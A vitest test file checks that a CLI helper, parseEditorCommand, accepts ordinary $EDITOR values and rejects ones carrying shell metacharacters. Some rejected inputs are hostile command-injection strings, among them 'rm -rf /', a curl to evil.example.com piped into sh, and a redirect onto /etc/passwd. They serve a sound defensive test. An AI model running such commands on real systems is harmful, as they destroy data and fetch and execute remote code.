import { describe, expect, it } from "vitest";
import { parseEditorCommand } from "../../../src/cli/arg-helpers.js";

describe("parseEditorCommand", () => {
  it("accepts a plain editor binary", () => {
    expect(parseEditorCommand("vim")).toEqual({ command: "vim", args: [] });
  });

  it("accepts standard editor invocations with whitespace flags", () => {
    expect(parseEditorCommand("code --wait")).toEqual({ command: "code", args: ["--wait"] });
    expect(parseEditorCommand("subl --wait")).toEqual({ command: "subl", args: ["--wait"] });
    expect(parseEditorCommand("vim -p")).toEqual({ command: "vim", args: ["-p"] });
  });

  it("accepts an absolute path to an editor", () => {
    expect(parseEditorCommand("/usr/local/bin/emacs --no-window-system")).toEqual({
      command: "/usr/local/bin/emacs",
      args: ["--no-window-system"],
    });
  });

  it("rejects $EDITOR containing semicolons", () => {
    expect(() => parseEditorCommand("vim;rm -rf /")).toThrow(/shell metacharacters/);
  });

  it("rejects $EDITOR using bash -c with quoted command (real attack vector)", () => {
    expect(() => parseEditorCommand("bash -c 'curl evil.example.com | sh'")).toThrow(
      /shell metacharacters/,
    );
  });

  it("rejects $EDITOR with backticks, pipes, redirects, ampersands", () => {
    expect(() => parseEditorCommand("vim `whoami`")).toThrow(/shell metacharacters/);
    expect(() => parseEditorCommand("vim | tee out")).toThrow(/shell metacharacters/);
    expect(() => parseEditorCommand("vim > /etc/passwd")).toThrow(/shell metacharacters/);
    expect(() => parseEditorCommand("vim & rm -rf")).toThrow(/shell metacharacters/);
    expect(() => parseEditorCommand("vim $(whoami)")).toThrow(/shell metacharacters/);
  });

  it("rejects $EDITOR with quotes (which a non-shell spawn cannot honor anyway)", () => {
    expect(() => parseEditorCommand('vim "arg with space"')).toThrow(/shell metacharacters/);
    expect(() => parseEditorCommand("vim 'single quoted'")).toThrow(/shell metacharacters/);
  });

  it("rejects empty editor", () => {
    expect(() => parseEditorCommand("")).toThrow(/empty/);
    expect(() => parseEditorCommand("   ")).toThrow(/empty/);
  });
});
